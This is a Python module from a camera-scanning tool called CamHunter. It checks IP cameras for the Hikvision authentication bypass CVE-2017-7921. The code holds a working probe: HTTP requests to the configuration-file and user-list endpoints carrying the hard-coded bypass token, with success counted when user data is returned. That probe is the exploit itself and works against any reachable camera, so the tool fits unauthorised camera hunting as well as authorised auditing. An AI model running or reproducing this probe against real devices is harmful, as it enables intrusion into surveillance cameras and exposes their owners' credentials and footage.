"""
CVE Checker Module for CamHunter v2.0
─────────────────────────────────────
Checks discovered cameras for known vulnerabilities.
"""

import logging
import requests
from typing import List, Optional

logger = logging.getLogger("camhunter.cve")

class CVEChecker:
    def __init__(self, cfg: dict):
        self.cfg = cfg
        self.timeout = 5

    def check(self, ip: str, brand: str) -> List[dict]:
        """
        Runs vulnerability checks based on camera brand.
        """
        vulnerabilities = []
        
        if brand.lower() == "hikvision":
            # Example: Check for CVE-2017-7921 (Backdoor/Auth Bypass)
            if self._check_hikvision_bypass(ip):
                vulnerabilities.append({
                    "id": "CVE-2017-7921",
                    "severity": "CRITICAL",
                    "description": "Authentication Bypass allowing full access to user list and snapshots."
                })
        
        return vulnerabilities

    def _check_hikvision_bypass(self, ip: str) -> bool:
        """
        Simple probe for Hikvision auth bypass vulnerability.
        """
        paths = [
            "/System/configurationFile?auth=YWRtaW46MTEK",
            "/Security/users?auth=YWRtaW46MTEK"
        ]
        for path in paths:
            try:
                url = f"http://{ip}{path}"
                r = requests.get(url, timeout=self.timeout)
                if r.status_code == 200 and ("<User" in r.text or "user" in r.text.lower()):
                    return True
            except Exception:
                continue
        return False
